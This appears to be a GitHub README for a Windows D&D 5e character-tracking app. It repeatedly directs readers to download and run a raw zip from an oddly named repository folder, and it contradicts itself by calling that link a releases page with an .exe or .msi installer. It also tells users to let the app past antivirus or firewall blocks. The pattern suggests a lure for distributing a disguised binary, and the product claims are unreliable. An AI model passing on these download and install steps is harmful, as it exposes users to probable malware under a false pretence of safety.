# 🎲 dnd-tracker - Manage Your D&D 5e Characters Easily

[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-blue?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip)

---

dnd-tracker is a local web app designed to help you manage your Dungeons & Dragons 5th Edition characters. It runs directly on your Windows PC and offers tools for handling characters, spells, inventory, combat, journals, and more. The app uses familiar rules from the Player’s Handbook (PHB) and includes simple guides to get you started.

---

## 🖥️ System Requirements

- Windows 10 or later (64-bit recommended)
- At least 4GB of RAM
- 500MB of free disk space
- Modern web browser (Chrome, Edge, or Firefox)
- Internet connection only required for downloading

dnd-tracker works entirely on your computer once installed. It does not send your data online.  

---

## 🚀 Getting Started: Download and Setup

1. Visit the releases page by clicking the big button above or this link:  
   https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip  

2. On the releases page, find the latest version. Look for a Windows installer file. This usually ends with `.exe` or `.msi`.  

3. Click to download the installer file. Your browser will save it to your Downloads folder or the folder you chose.  

4. After download finishes, open the installer file by double-clicking it. Windows may ask for permission to run the file. Allow it.

5. Follow the on-screen setup instructions. The installer will copy files and create shortcuts for you.  

6. When setup completes, launch dnd-tracker from your desktop or Start menu shortcut.  

---

## 🕹️ Using dnd-tracker for the First Time

When you open the app, you’ll see an onboarding wizard. This wizard walks you through creating your first character. It explains each step in plain language.  

- Add basic details: name, race, class, and background  
- Choose your character’s attributes (strength, dexterity, etc.)  
- Pick spells, equipment, and features  
- Use beginner-friendly tooltips if you need explanations  

The app saves everything locally in a small database file on your PC. This means your character data stays private and only accessible to you.

---

## 🎯 Main Features

- **Character Management:** Create and track multiple characters  
- **Spell Tracking:** View and organize spells with rule references  
- **Inventory Management:** Add and update items with notes and quantities  
- **Combat Tracker:** Manage initiative, hit points, and conditions during encounters  
- **Journal:** Keep notes, adventure logs, and session summaries  
- **Built-In Rules:** Includes core rules from the Player’s Handbook (PHB) to simplify gameplay  
- **Tooltips:** Clear explanations for terms and rules when you hover or click  
- **Local Storage:** All your data stays on your device; no account or internet is needed after installation  

---

## 🔧 How dnd-tracker Works

The app uses two parts working together:

- **React Frontend:** This runs in your web browser, presenting an easy-to-use interface with responsive design.  
- **FastAPI Backend:** This runs locally on your PC and handles data storage, rules logic, and calculations securely.  

You don’t need to install these parts separately. The installer includes everything and runs the backend automatically when you start the app.

---

## 📂 Managing Your Data Safely

All information you enter saves to a local SQLite database on your computer. This method gives you control over your data and ensures privacy. You can back up your data simply by copying the app’s data folder, usually found in your Documents or AppData folder.

---

## ⚙️ Settings and Customization

Inside the app, you can adjust these settings:

- Choose a light or dark theme for easy reading  
- Set default character options to speed up profiles  
- Enable or disable beginner tooltips based on your experience  
- Export your characters or journal entries as JSON or text files  
- Reset the database if you want to start fresh  

All changes save immediately and remain after you close the app.

---

## 🛠️ Troubleshooting Common Issues

If dnd-tracker does not start:

- Check if your antivirus or firewall blocks the app. Allow it access if needed.  
- Make sure you have the latest Windows updates installed.  
- Restart your computer and try launching again.  

If you lose progress unexpectedly:

- Use the backup copy of your data folder to restore.  
- Avoid deleting app files or moving folders created by the installer.  

If you see errors during character creation:

- Use the tooltips and help icons to review requirements.  
- Restart the app to refresh data.  

---

## 🔗 Download dnd-tracker

Return to the releases page anytime to get updates or reinstall:  

[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-green?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip)

---

## 📚 Additional Resources

- Explore the Player’s Handbook for detailed rules  
- Use online D&D resources for tips on roleplaying and combat  
- Backup your data regularly to avoid losing progress  

---

## 🧰 Technical Details (Optional)

- Written with React for the user interface  
- Backend runs on FastAPI with Python  
- Data stored locally using SQLite database  
- Styles managed using Tailwind CSS  
- Compatible with Windows 10+  
- Open source; you may view source files in the repository  

---

## 🗂️ File Locations

Once installed, main files are typically here:

- Program folder: `C:\Program Files\dnd-tracker`  
- User data folder: `%UserProfile%\Documents\dnd-tracker-data` or `%AppData%\dnd-tracker`  

---

dnd-tracker offers a local, easy way to keep your D&D 5e sessions organized without needing extra tools or accounts. Just download, install, and start managing your characters and campaigns right away.